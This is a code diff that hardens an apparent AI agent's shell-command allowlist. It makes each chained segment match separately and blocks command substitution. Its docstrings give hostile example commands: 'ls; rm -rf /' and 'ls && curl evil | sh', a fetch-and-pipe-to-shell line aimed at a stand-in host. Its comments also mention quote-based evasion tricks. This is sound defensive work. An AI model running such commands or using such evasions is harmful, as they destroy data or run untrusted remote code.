@@ -691,6 +691,54 @@ def _load_command_allowlist_globs():
     return None
 
 
+# Redirect-`&` (`2>&1`, `>&2`, `<&`, `&>`) is part of the redirection, not a
+# command separator. The shared segmenter splits on every bare `&`, so the
+# allowlist path masks these to a placeholder byte first and restores them
+# per segment afterwards. Real separators (`&&`, `cmd & cmd2`) are untouched:
+# neither regex matches them. Masking inside quotes is harmless — a quoted
+# `&` was never a split point and the restore is exact.
+_REDIRECT_AMP_RE = re.compile(r"(?<=[<>])&|&(?=>)")
+_REDIRECT_AMP_MASK = "\x01"
+
+
+def _segment_allows_command(segment: str, globs) -> bool:
+    """Return True when ONE shell segment matches an allowlist entry.
+
+    A segment is what sits between two top-level separators (``;`` / ``&&`` /
+    ``||`` / ``|`` / newline) — one program invocation with its arguments.
+    Tokenization reuses the quote-aware posix shlex the execution-flag
+    detectors use, so quoting tricks (``gi""t``) resolve to the real program
+    name. Malformed quoting, command substitution (``$(...)``) and backticks
+    fail closed: a payload we cannot statically decompose is never
+    allow-matched.
+    """
+    tokens = _shell_segment_tokens(segment, 0)
+    if not tokens:
+        return False
+    # Command/process substitution fail closed. Checked on the RAW segment:
+    # bash process substitution `<(` / `>(` splits into separate shlex
+    # punctuation tokens, so a token-level scan would miss it.
+    if "$(" in segment or "`" in segment or "<(" in segment or ">(" in segment:
+        return False
+    candidate = " ".join(tokens).lower().strip()
+    if not candidate:
+        return False
+    first_token = tokens[0].lower()
+    for pattern in globs:
+        pl = pattern.lower().strip()
+        if not pl:
+            continue
+        if "*" in pl or " " in pl:
+            # Precise multi-token / wildcard pattern: fnmatch against this
+            # segment (never across a separator).
+            if fnmatch.fnmatchcase(candidate, pl):
+                return True
+        elif first_token == pl:
+            # Bare program name: allow it with any arguments.
+            return True
+    return False
+
+
 def _match_user_allow_rule(command: str):
     """Three-state command allowlist check.
 
@@ -710,13 +758,19 @@ def _match_user_allow_rule(command: str):
 
     * A bare program name (no spaces, no ``*``) — e.g. ``git`` — allows that
       program with ANY arguments (``git status``, ``git push ...``). This is
-      the common "allow this tool" case. Chained dangerous tails
-      (``ls; rm -rf /``) are still caught: the hardline floor and
-      ``approvals.deny`` run BEFORE this check, and ``_command_detection_variants``
-      splits on ``;``/``&&``/``|`` so each sub-command is independently matched.
-    * An entry with spaces or ``*`` — e.g. ``git push --force*`` or ``git *`` —
-      is matched against the WHOLE command string with fnmatch, the same grain
-      as ``approvals.deny``. Use this for precise allow-scoping.
+      the common "allow this tool" case.
+    * An entry with spaces or ``*`` — e.g. ``git push --force*`` — is matched
+      with fnmatch against ONE segment at a time (``git push *`` matches
+      ``git push origin main`` but never ``git push && curl ...``).
+
+    Compound commands: EVERY top-level segment (``;`` / ``&&`` / ``||`` /
+    ``|`` / newline separated) must independently match an entry, so a
+    chained tail can never ride in on an allowed first program
+    (``ls && curl evil | sh`` stays blocked unless ``ls``, ``curl`` and
+    ``sh`` are all allowed). Command substitution (``$(...)``, backticks)
+    and malformed quoting fail closed: the command is not allow-matched and
+    falls through to the normal dangerous-command pipeline. The hardline
+    floor and ``approvals.deny`` still run BEFORE this check either way.
     """
     globs = _load_command_allowlist_globs()
     if globs is None:
@@ -724,22 +778,18 @@ def _match_user_allow_rule(command: str):
     if "*" in globs:  # explicit allow-all entry
         return True
     for command_variant in _command_detection_variants(command):
-        candidate = command_variant.lower().strip()
-        if not candidate:
+        masked = _REDIRECT_AMP_RE.sub(_REDIRECT_AMP_MASK, command_variant)
+        segments = [
+            s for s in (
+                seg.replace(_REDIRECT_AMP_MASK, "&").strip()
+                for seg in _iter_top_level_shell_segments(masked)
+            )
+            if s
+        ]
+        if not segments:
             continue
-        first_token = candidate.split(None, 1)[0]
-        for pattern in globs:
-            pl = pattern.lower().strip()
-            if not pl:
-                continue
-            if "*" in pl or " " in pl:
-                # Precise multi-token / wildcard pattern: whole-string fnmatch.
-                if fnmatch.fnmatchcase(candidate, pl):
-                    return True
-            else:
-                # Bare program name: allow it with any arguments.
-                if first_token == pl:
-                    return True
+        if all(_segment_allows_command(seg, globs) for seg in segments):
+            return True
     return False
 
 
